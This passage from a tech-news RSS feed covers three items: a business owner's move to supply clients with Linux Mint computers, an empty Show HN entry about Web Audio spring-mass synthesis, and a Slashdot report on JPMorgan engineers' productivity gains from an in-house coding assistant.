[...] Sorensen, who founded the company in 1998, told us that he's comfortable giving clients computers that run Linux Mint, a free OS that's based on Ubuntu. The latest version of Mint, version 22.1, will be supported until 2029. "Ten years ago if we distributed Linux, they would be like what is it," he said. But today, he notes that many view their computers as windows to the Internet and, for that, a user-friendly version of Linux is acceptable. Further reading: Is 2025 the Year of the Linux Desktop?]]></content:encoded></item><item><title>Show HN: Web Audio Spring-Mass Synthesis</title><link>https://blog.cochlea.xyz/string.html</link><author>cochlear</author><category>dev</category><category>hn</category><pubDate>Fri, 14 Mar 2025 21:27:25 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>JPMorgan Engineers&apos; Efficiency Jumps as Much as 20% From Using Coding Assistant</title><link>https://developers.slashdot.org/story/25/03/14/2020232/jpmorgan-engineers-efficiency-jumps-as-much-as-20-from-using-coding-assistant?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>dev</category><category>slashdot</category><pubDate>Fri, 14 Mar 2025 20:20:00 +0000</pubDate><source url="https://developers.slashdot.org/">Dev - Slashdot - Dev</source><content:encoded><![CDATA[Tens of thousands of JPMorgan Chase software engineers increased their productivity 10% to 20% by using a coding assistant tool developed by the bank, its global chief information officer Lori Beer said. From a report: The gains present "a great opportunity" for the lender to assign its engineers to other projects, Beer told Reuters ahead of DevUp, an internal conference hosted by JPMorgan, bringing together its top engineers in India this year. The largest lender in the U.S. had a technology budget of $17 billion for 2024. Its tech workforce of 63,000 employees, with a third of them based in India, represents about 21% of its global headcount. The efficiency gains from the coding assistant will also allow JPMorgan's engineers to devote more time to high-value projects focusing on artificial intelligence and data, Beer said.]]></content:encoded></item></channel></rss>